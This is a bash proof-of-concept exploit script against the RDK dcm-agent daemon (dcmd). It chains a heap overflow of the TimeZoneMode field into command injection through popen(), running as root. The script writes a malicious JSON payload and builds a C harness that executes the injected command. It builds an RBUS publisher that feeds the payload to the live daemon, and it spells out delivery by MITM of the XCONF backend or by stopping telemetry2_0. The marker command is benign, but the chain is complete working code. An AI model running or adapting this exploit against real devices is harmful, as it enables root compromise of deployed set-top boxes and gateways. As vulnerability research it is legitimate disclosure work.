#!/bin/bash
###############################################################################
# PoC: DCM-002
# Title: Shell command injection via unescaped cRdkPath in popen()
#        (reachable from XCONF/RBUS via adjacent-field heap overflow of
#         cTimeZone[16] -> cRdkPath[80])
#
# CWE-78 (command injection) chained with CWE-122 (heap buffer overflow)
#
# Target: dcmd (RDK dcm-agent), runs as root, umask(0)
#
# ----------------------------------------------------------------------------
# ROOT CAUSE
# ----------------------------------------------------------------------------
# 1) dcm_parseconf.h:51-60 defines DCMSettingsHandle.  All members are INT8
#    (== char) arrays, so there is NO compiler padding between them:
#
#        offset   size   field
#        ------   ----   ----------------------------------------------
#        +0       2048   cJsonStr [DCM_JSON_STRSIZE]
#        +2048     128   cUploadURL[MAX_URL_SIZE]
#        +2176       8   cUploadPrtl[8]
#        +2184      16   cTimeZone[16]      <== strcpy() DESTINATION
#        +2200      80   cRdkPath[80]       <== OVERFLOW TARGET (popen sink)
#        +2280    1024   ctBuff[EXECMD_BUFF_SIZE]
#
# 2) dcm_parseconf.c:551 -> dcmSettingJsonGetVal() -> line 224:
#        strcpy(sval, pJsonItem->valuestring);   // sval == cTimeZone, no bound
#    The JSON key copied is "urn:settings:TimeZoneMode" (DCM_TIMEZONE).
#
# 3) dcm.c:107-113 (DCM_DIFD_SCHED branch of dcmRunJobs):
#        snprintf(pExecBuff, 1024,
#                 "/bin/sh %s/swupdate_utility.sh 0 2 >> /opt/logs/swupdate.log 2>&1",
#                 pRDKPath);                     // pRDKPath == cRdkPath, NOT escaped
#        dcmUtilsSysCmdExec(pExecBuff);          // -> popen(cmd,"r") @ dcm_utils.c:96
#
# ----------------------------------------------------------------------------
# OFFSET MATH
# ----------------------------------------------------------------------------
#   strcpy(cTimeZone, PAYLOAD)
#     PAYLOAD[0 .. 15]  -> cTimeZone[0..15]   (16 bytes of padding)
#     PAYLOAD[16 .. N]  -> cRdkPath[0 .. N-16]
#     PAYLOAD[N] = '\0' -> cRdkPath[N-16] = '\0'   (clean terminator)
#
#   We choose cRdkPath := "/dev/null;id>/tmp/PWNED_DCM-002;#"   (33 bytes)
#   Total PAYLOAD length = 16 + 33 = 49 bytes  (< 16+80, so we do NOT spill
#   into ctBuff -> overflow is fully contained and deterministic).
#
#   Resulting popen() string (executed via /bin/sh -c "..."):
#     /bin/sh /dev/null;id>/tmp/PWNED_DCM-002;#/swupdate_utility.sh 0 2 >> ...
#       cmd1: /bin/sh /dev/null   -> exits 0 instantly
#       cmd2: id>/tmp/PWNED_DCM-002   -> writes uid=0(root)... as PROOF
#       '#'  : comments out the trailing "/swupdate_utility.sh ..." junk
#
# ----------------------------------------------------------------------------
# DELIVERY CHAIN (how the JSON reaches dcmSettingParseConf)
# ----------------------------------------------------------------------------
#   dcmd subscribes (dcm_rbus.c:430-448) to two RBUS events normally provided
#   by telemetry2_0:
#       Device.DCM.Setconfig      payload key "dcmSetConfig" = <path-to-json>
#       Device.DCM.Processconfig  (any payload) -> sets schedJob=1
#   main() while(1) @ dcm.c:355-390 then calls
#       dcmSettingParseConf(handle, confPath, logCron, difdCron)  -> OVERFLOW
#       dcmSchedStartJob(pDifdSchedHandle, difdCron)              -> arms cron
#   When "urn:settings:CheckSchedule:cron" = "* * * * *" the FW_UPDATE job
#   fires within <=60s and dcmRunJobs() popen()'s the injected command.
#
#   PRIMARY remote vector: malicious / compromised XCONF backend (or MITM of
#   the telemetry2_0 <-> XCONF channel) serves this JSON.
#   LOCAL privesc vector: any RBUS client that can register as provider for
#   Device.DCM.{Setconfig,Processconfig} (i.e. before / instead of T2).
#
# ----------------------------------------------------------------------------
# WHAT THIS SCRIPT DOES
# ----------------------------------------------------------------------------
#   STEP 1  Craft the malicious single-line JSON -> /tmp/dcm002_evil.json
#           (this file alone is the payload an XCONF MITM would serve)
#   STEP 2  Build & run a tiny offline harness that replicates the exact
#           struct layout + strcpy + snprintf to PROVE the offset math and
#           show the final popen() string -- works on ANY Linux box with gcc.
#   STEP 3  (on-device only) Build & run an RBUS publisher that registers
#           Device.DCM.{Setconfig,Processconfig} and feeds the JSON path to
#           the running dcmd.
#   STEP 4  Poll for /tmp/PWNED_DCM-002 for up to 120s.
#
###############################################################################
set -u

EVIL_JSON="/tmp/dcm002_evil.json"
PROOF="/tmp/PWNED_DCM-002"
HARNESS_SRC="/tmp/dcm002_harness.c"
HARNESS_BIN="/tmp/dcm002_harness"
PUB_SRC="/tmp/dcm002_rbus_pub.c"
PUB_BIN="/tmp/dcm002_rbus_pub"

C_RED='\033[1;31m'; C_GRN='\033[1;32m'; C_YEL='\033[1;33m'; C_RST='\033[0m'
log()  { printf "[*] %s\n" "$*"; }
ok()   { printf "${C_GRN}[+] %s${C_RST}\n" "$*"; }
warn() { printf "${C_YEL}[!] %s${C_RST}\n" "$*"; }
err()  { printf "${C_RED}[-] %s${C_RST}\n" "$*"; }

rm -f "$PROOF"

###############################################################################
# STEP 1 -- craft malicious DCM/XCONF JSON
###############################################################################
# 16 bytes of padding to fill cTimeZone[0..15] exactly:
PAD="AAAAAAAAAAAAAAAA"                                   # 16 x 'A'
# Bytes 16.. land at cRdkPath[0]:
INJECT='/dev/null;id>/tmp/PWNED_DCM-002;#'               # 33 bytes
TZ_PAYLOAD="${PAD}${INJECT}"                             # 49 bytes total

if [ ${#PAD} -ne 16 ]; then err "PAD length != 16"; exit 1; fi
log "TimeZoneMode payload length = ${#TZ_PAYLOAD} (16 pad + ${#INJECT} inject)"

# NOTE: dcmSettingJsonInit() reads the file with a SINGLE fgets(buf,2048,fp),
#       so the entire JSON object must be on ONE line, < 2047 bytes.
# NOTE: UploadOnReboot is set to integer 2 so that NEITHER the
#       'uploadCheck==1' nor 'uploadCheck==0' branch in dcmSettingParseConf()
#       triggers an immediate uploadstblogs_run() side-effect.
# NOTE: Both cron strings are 9 bytes ("* * * * *") -> fit in logCron[16] /
#       difdCron[16] without secondary overflow of DCMDHandle.
printf '%s' \
'{"urn:settings:LogUploadSettings:UploadOnReboot":2,'\
'"urn:settings:LogUploadSettings:UploadSchedule:cron":"* * * * *",'\
'"urn:settings:CheckSchedule:cron":"* * * * *",'\
"\"urn:settings:TimeZoneMode\":\"${TZ_PAYLOAD}\"}" > "$EVIL_JSON"

ok "Wrote malicious XCONF/DCM JSON -> $EVIL_JSON ($(wc -c < "$EVIL_JSON") bytes)"
log "JSON content:"
printf '    %s\n' "$(cat "$EVIL_JSON")"

###############################################################################
# STEP 2 -- offline verification harness (proves offset math on ANY host)
###############################################################################
cat > "$HARNESS_SRC" <<'EOF'
/* DCM-002 offline harness: replicates the EXACT struct layout from
 * dcm_parseconf.h + the unbounded strcpy from dcm_parseconf.c:224 + the
 * snprintf->popen sink from dcm.c:109-113, so the offset math can be
 * verified independently of the live daemon. */
#include <stdio.h>
#include <string.h>
#include <stddef.h>
#include <stdlib.h>

#define DCM_JSON_STRSIZE          2048
#define MAX_URL_SIZE              128
#define MAX_DEVICE_PROP_BUFF_SIZE 80
#define EXECMD_BUFF_SIZE          1024

typedef char INT8;

typedef struct _dcmSettingsHandle {
    INT8  cJsonStr[DCM_JSON_STRSIZE];
    INT8  cUploadURL[MAX_URL_SIZE];
    INT8  cUploadPrtl[8];
    INT8  cTimeZone[16];                         /* strcpy DEST */
    INT8  cRdkPath[MAX_DEVICE_PROP_BUFF_SIZE];   /* OVERFLOW TARGET */
    INT8  ctBuff[EXECMD_BUFF_SIZE];
    int   bRebootFlag;
} DCMSettingsHandle;

int main(int argc, char **argv)
{
    if (argc < 2) { fprintf(stderr,"usage: %s <TimeZoneMode-value>\n",argv[0]); return 2; }

    fprintf(stderr,"[harness] offsetof(cTimeZone) = %zu\n", offsetof(DCMSettingsHandle,cTimeZone));
    fprintf(stderr,"[harness] offsetof(cRdkPath)  = %zu  (delta = %zu, expect 16)\n",
            offsetof(DCMSettingsHandle,cRdkPath),
            offsetof(DCMSettingsHandle,cRdkPath)-offsetof(DCMSettingsHandle,cTimeZone));

    DCMSettingsHandle *h = calloc(1,sizeof(*h));
    /* Simulate dcmSettingsInit(): cRdkPath seeded from /etc/include.properties */
    strcpy(h->cRdkPath, "/lib/rdk");

    /* === VULNERABLE LINE: dcm_parseconf.c:224 === */
    strcpy(h->cTimeZone, argv[1]);

    fprintf(stderr,"[harness] post-overflow cTimeZone = \"%s\"\n", h->cTimeZone);
    fprintf(stderr,"[harness] post-overflow cRdkPath  = \"%s\"\n", h->cRdkPath);

    /* === SINK: dcm.c:109-113 === */
    char pExecBuff[EXECMD_BUFF_SIZE];
    snprintf(pExecBuff, EXECMD_BUFF_SIZE,
             "/bin/sh %s/swupdate_utility.sh 0 2 >> /opt/logs/swupdate.log 2>&1",
             h->cRdkPath);
    fprintf(stderr,"[harness] popen() string that dcmd would execute as ROOT:\n");
    fprintf(stderr,"          %s\n", pExecBuff);

    /* Actually execute it (as the CURRENT user) to demonstrate the injection
     * lands -- this creates /tmp/PWNED_DCM-002 even off-device. */
    FILE *fp = popen(pExecBuff, "r");
    if (fp) pclose(fp);

    free(h);
    return 0;
}
EOF

if command -v gcc >/dev/null 2>&1; then
    # -fno-stack-protector / no FORTIFY so the deliberate strcpy overflow
    # inside the contiguous heap struct is not aborted by _chk wrappers.
    if gcc -O0 -fno-stack-protector -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=0 \
           -o "$HARNESS_BIN" "$HARNESS_SRC" 2>/dev/null; then
        ok "Built offline verification harness -> $HARNESS_BIN"
        log "Running harness with crafted TimeZoneMode value..."
        echo "----------------------------------------------------------------"
        "$HARNESS_BIN" "$TZ_PAYLOAD"
        echo "----------------------------------------------------------------"
        if [ -f "$PROOF" ]; then
            ok "OFFLINE PROOF: harness popen() created $PROOF :"
            sed 's/^/        /' "$PROOF"
            ok "Offset math VERIFIED. Same string runs as uid=0 inside dcmd."
        else
            warn "Harness ran but $PROOF not created (check output above)."
        fi
    else
        warn "gcc failed to build harness; skipping offline verification."
    fi
else
    warn "gcc not found; skipping offline verification harness."
fi

###############################################################################
# STEP 3 -- on-device RBUS delivery (local non-root -> root privesc path)
###############################################################################
echo
log "=== ON-DEVICE DELIVERY (RBUS) ==="

# Precondition warnings
if [ -r /etc/device.properties ] && grep -q '^ENABLE_MAINTENANCE' /etc/device.properties 2>/dev/null; then
    warn "PRECONDITION FAIL: ENABLE_MAINTENANCE is set in /etc/device.properties"
    warn "  -> dcmRunJobs() returns early at dcm.c:59-62 BEFORE popen()."
    warn "  -> This specific sink is NOT reachable on this device build."
fi
if pgrep -x telemetry2_0 >/dev/null 2>&1; then
    warn "telemetry2_0 is running and likely already owns Device.DCM.Setconfig."
    warn "  For local-privesc demo: stop it (systemctl stop telemetry2_0) or"
    warn "  race it at boot. The XCONF/MITM vector does not have this limit."
fi
if ! pgrep -x dcmd >/dev/null 2>&1; then
    warn "dcmd does not appear to be running; on-device step will not land."
fi

cat > "$PUB_SRC" <<'EOF'
/* DCM-002 RBUS publisher: registers as provider for the two events dcmd
 * subscribes to (dcm_rbus.c:430-448), then publishes:
 *   Device.DCM.Setconfig      { "dcmSetConfig" : "<path-to-evil-json>" }
 *   Device.DCM.Processconfig  { ...anything... }  -> sets schedJob=1
 * dcmd's main loop (dcm.c:355-390) then parses the JSON (overflow happens
 * here) and arms the FW_UPDATE cron, which fires <=60s later -> popen RCE.
 */
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <rbus.h>

#define EV_SETCONF   "Device.DCM.Setconfig"
#define EV_PROCCONF  "Device.DCM.Processconfig"
#define EV_RELOAD    "Device.X_RDKCENTREL-COM.Reloadconfig"
#define KEY_SETCONF  "dcmSetConfig"

static volatile int g_sub_set = 0, g_sub_proc = 0;

static rbusError_t subCB(rbusHandle_t h, rbusEventSubAction_t a,
                         const char *name, rbusFilter_t f,
                         int32_t iv, bool *ap)
{
    (void)h;(void)f;(void)iv;(void)ap;
    if (a == RBUS_EVENT_ACTION_SUBSCRIBE) {
        fprintf(stderr,"[pub] dcmd subscribed to %s\n", name);
        if (!strcmp(name, EV_SETCONF))  g_sub_set  = 1;
        if (!strcmp(name, EV_PROCCONF)) g_sub_proc = 1;
    }
    return RBUS_ERROR_SUCCESS;
}

static void reloadCB(rbusHandle_t h, rbusEvent_t const *e,
                     rbusEventSubscription_t *s)
{ (void)h;(void)e;(void)s; fprintf(stderr,"[pub] dcmd published Reloadconfig\n"); }

static int pub(rbusHandle_t h, const char *evname,
               const char *key, const char *val)
{
    rbusValue_t v; rbusObject_t d; rbusEvent_t ev = {0};
    rbusValue_Init(&v);  rbusValue_SetString(v, val);
    rbusObject_Init(&d, NULL); rbusObject_SetValue(d, key, v);
    ev.name = evname; ev.data = d; ev.type = RBUS_EVENT_GENERAL;
    int rc = rbusEvent_Publish(h, &ev);
    rbusValue_Release(v); rbusObject_Release(d);
    return rc;
}

int main(int argc, char **argv)
{
    const char *conf = (argc > 1) ? argv[1] : "/tmp/dcm002_evil.json";
    rbusHandle_t h;
    int rc = rbus_open(&h, "DCM002_PoC_Publisher");
    if (rc != RBUS_ERROR_SUCCESS) {
        fprintf(stderr,"[pub] rbus_open failed rc=%d (rtrouted running?)\n",rc);
        return 1;
    }

    rbusDataElement_t el[2] = {
        { EV_SETCONF,  RBUS_ELEMENT_TYPE_EVENT, {NULL,NULL,NULL,NULL,subCB,NULL} },
        { EV_PROCCONF, RBUS_ELEMENT_TYPE_EVENT, {NULL,NULL,NULL,NULL,subCB,NULL} },
    };
    rc = rbus_regDataElements(h, 2, el);
    if (rc != RBUS_ERROR_SUCCESS)
        fprintf(stderr,"[pub] regDataElements rc=%d (telemetry2_0 may already own these)\n",rc);
    else
        fprintf(stderr,"[pub] registered as provider for %s / %s\n",EV_SETCONF,EV_PROCCONF);

    /* Subscribe to dcmd's own event so its g_eventsub flips (dcm_rbus.c:166-169)
     * and it advances past the first while(1) gate at dcm.c:334-344. */
    rbusEvent_Subscribe(h, EV_RELOAD, reloadCB, NULL, 10);

    /* Wait up to 30s for dcmd's async subscriptions to resolve to us. */
    int i;
    for (i = 0; i < 30 && !(g_sub_set && g_sub_proc); i++) sleep(1);
    if (g_sub_set && g_sub_proc)
        fprintf(stderr,"[pub] dcmd is subscribed -- delivering payload\n");
    else
        fprintf(stderr,"[pub] no sub-callback after %ds; publishing blind\n", i);

    /* Publish a few times to be robust against races / 1s poll loop in dcmd */
    for (i = 0; i < 5; i++) {
        rc = pub(h, EV_SETCONF,  KEY_SETCONF, conf);
        fprintf(stderr,"[pub] publish %s {%s:\"%s\"} rc=%d\n",EV_SETCONF,KEY_SETCONF,conf,rc);
        sleep(1);
        rc = pub(h, EV_PROCCONF, "trigger", "go");
        fprintf(stderr,"[pub] publish %s rc=%d\n",EV_PROCCONF,rc);
        sleep(1);
    }

    rbus_close(h);
    return 0;
}
EOF

RBUS_OK=0
if command -v gcc >/dev/null 2>&1; then
    # Try pkg-config first, then common RDK locations.
    CFLAGS=""; LIBS="-lrbus"
    if command -v pkg-config >/dev/null 2>&1 && pkg-config --exists rbus 2>/dev/null; then
        CFLAGS="$(pkg-config --cflags rbus)"
        LIBS="$(pkg-config --libs rbus)"
    else
        for d in /usr/include/rbus /usr/local/include/rbus; do
            [ -d "$d" ] && CFLAGS="$CFLAGS -I$d"
        done
    fi
    if gcc $CFLAGS -o "$PUB_BIN" "$PUB_SRC" $LIBS 2>/tmp/dcm002_gcc.err; then
        ok "Built RBUS publisher -> $PUB_BIN"
        RBUS_OK=1
    else
        warn "Could not build RBUS publisher (librbus headers/lib not found)."
        warn "gcc stderr: $(tr '\n' ' ' < /tmp/dcm002_gcc.err 2>/dev/null)"
    fi
fi

if [ "$RBUS_OK" = "1" ]; then
    rm -f "$PROOF"   # clear offline-harness proof so we see the REAL one
    log "Launching RBUS publisher to feed $EVIL_JSON to dcmd ..."
    "$PUB_BIN" "$EVIL_JSON" &
    PUB_PID=$!

    log "Waiting up to 120s for FW_UPDATE cron ('* * * * *') to fire in dcmd..."
    for i in $(seq 1 120); do
        if [ -f "$PROOF" ]; then
            echo
            ok  "EXPLOIT REACHED -- dcmd (root) created $PROOF :"
            sed 's/^/        /' "$PROOF"
            ok  "ROOT COMMAND EXECUTION CONFIRMED (DCM-002)"
            kill "$PUB_PID" 2>/dev/null
            wait "$PUB_PID" 2>/dev/null
            exit 0
        fi
        sleep 1
    done
    kill "$PUB_PID" 2>/dev/null; wait "$PUB_PID" 2>/dev/null
    err "Timed out waiting for $PROOF."
    err "Check: dcmd running? ENABLE_MAINTENANCE unset? telemetry2_0 stopped?"
    err "Inspect dcmd log for: 'TimeZone : AAAAAAAAAAAAAAAA/dev/null;id>...'"
    exit 1
else
    echo
    warn "================  MANUAL / XCONF DELIVERY FALLBACK  ================"
    warn "librbus toolchain unavailable on this host. The malicious JSON has"
    warn "still been written to: $EVIL_JSON"
    warn ""
    warn "OPTION A (remote / XCONF MITM -- the primary High-severity vector):"
    warn "  Serve the contents of $EVIL_JSON as the HTTP body of the XCONF"
    warn "  DCM settings response that telemetry2_0 fetches. T2 will write it"
    warn "  to its persistent path and publish Device.DCM.Setconfig /"
    warn "  Device.DCM.Processconfig to dcmd automatically."
    warn ""
    warn "OPTION B (on-device, copy publisher to target):"
    warn "  scp $PUB_SRC to the device, then on-device run:"
    warn "    gcc -I/usr/include/rbus -o $PUB_BIN $PUB_SRC -lrbus"
    warn "    systemctl stop telemetry2_0   # free the event provider slot"
    warn "    $PUB_BIN $EVIL_JSON"
    warn ""
    warn "VERIFY: within ~60s of Processconfig, /tmp/PWNED_DCM-002 appears"
    warn "        on the device containing 'uid=0(root)'."
    warn "===================================================================="
    exit 0
fi
